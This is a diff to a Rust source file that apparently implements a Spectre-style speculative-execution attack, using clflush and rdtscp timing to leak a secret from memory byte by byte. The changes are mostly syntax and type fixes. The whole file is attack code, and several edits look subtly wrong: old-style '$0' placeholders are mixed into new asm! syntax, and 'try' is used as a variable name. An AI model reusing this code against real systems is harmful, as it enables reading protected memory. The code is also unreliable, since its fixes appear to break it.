@@ -1,11 +1,16 @@
-extern crate core_affinity;
+#![feature(asm)]
 
+extern crate core_affinity;
 use std::arch::asm;
 use std::mem;
 use std::ptr;
 use std::sync::mpsc;
 use std::thread;
 use std::time::{Duration, Instant};
+use std::sync::atomic::{AtomicU64, Ordering};
+use rand::seq::SliceRandom;
+use rand::thread_rng;
+
 
 const CACHE_HIT_THRESHOLD: u64 = 80;
 const NUM_TRIES: u64 = 1000;
@@ -39,7 +44,7 @@ fn high_speed_timer() {
 }
 
 unsafe fn clflush(addr: *const u8) {
-    asm!("clflush [$0]" :: "r"(addr) :: "volatile");
+    asm!("clflush [$0]", in(reg) addr);
 }
 
 fn init_attack() -> (Vec<bool>, Vec<u8>) {
@@ -64,7 +69,7 @@ fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, a
             clflush(&arr2[i * 512]);
         }
 
-        let train_idx = try % arr1_size;
+        let train_idx = (try as usize) % arr1_size;
         let mut results = [0; 256];
 
         for i in (0..TRAINING_LOOPS).rev() {
@@ -93,7 +98,7 @@ fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, a
             let curr_char = attack_pattern[i as usize];
             if results[curr_char as usize] >= LIKELY_THRESHOLD {
                 if curr_char >= 31 && curr_char <= 127 {
-                    most_likely_char = curr_char;
+                    most_likely_char = curr_char as char;
                     break;
                 }
             }
@@ -103,8 +108,6 @@ fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, a
 
     secret
 }
-
-#![feature(asm)]
 
 fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize) -> i32 {
     // This function simulates the behavior of the C++ `fetch_function`.
@@ -129,7 +132,7 @@ fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize) -> i32 {
                     "lfence",
                     "rdtscp",
                     "mov {}, rax",
-                    "clflush [{}]",
+                    "clflush [$0]",
                     "rdtscp",
                     "mov {}, rax",
                     "lfence",
